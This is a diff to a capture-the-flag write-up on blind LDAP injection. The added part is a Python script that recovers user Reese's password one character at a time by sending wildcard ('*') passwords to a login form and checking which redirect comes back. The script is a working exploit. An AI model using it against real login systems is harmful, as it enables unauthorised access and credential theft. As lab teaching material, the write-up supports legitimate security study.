@@ -22,3 +22,45 @@ Remember that at the start of the challenge we identified the user Reese. We can
 Here I got stuck for a bit, as it was not clear what we should attack next to get the flag for the challenge. I read through the ![PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/README.md) page again, and realised we might want to try blind exploitation. This allows us to brute force the password one by one, whereas previously we just bypassed the password altogether. This allows us to figure out the password, which will hopefully be the flag for the challenge. We can test if Reese's password contains the flag by logging in with the username Reese, and password HTB*. This will be successful if the password starts with HTB, indicating it is a flag. Luckily, this works!
 
 Bruteforcing the password by hand will take quite a lot of work, especially considering flags often contain both uppercase and lowercase letters, as well as numbers and some other characters. Let's thus create a script for this. This script should brute force character by character, and add the character to the password if the login succeeds. Testing the login by hand reveals that both successful and unsuccessful logins result in a redirect (HTTP status code 302), but a successful login redirects to / and an unsuccessful one redirects to /login?message=Authentication%20failed. 
+
+Below is the Python script I created to extract the flag:
+
+```
+import requests
+import string
+
+TARGET_URL = "http://<IP>:<PORT>" # Change to actual IP and PORT
+LOGIN_PATH = "/login"
+USERNAME = "Reese"
+PASSWORD = ""
+
+CHARACTER_SET = string.ascii_letters + string.digits + '_-{}!'
+
+
+def check_password(username, password):
+    login_url = f"{TARGET_URL}{LOGIN_PATH}"
+    data = {
+        "username": username,
+        "password": password
+    }
+    response = requests.post(login_url, data=data, allow_redirects=False)
+    redirect_location = response.headers.get('Location')
+    if redirect_location == "/":
+        return True
+    else:
+        return False
+
+
+
+while True:
+    for char in CHARACTER_SET:
+        current_guess = PASSWORD + char
+        print(f"[*] Progress: {current_guess}", end='\r')
+        if check_password(USERNAME, current_guess + "*"):
+            PASSWORD += char
+            break
+    if char == "}":
+        break
+    
+print(f"\n[*] Found password: {PASSWORD}")
+```
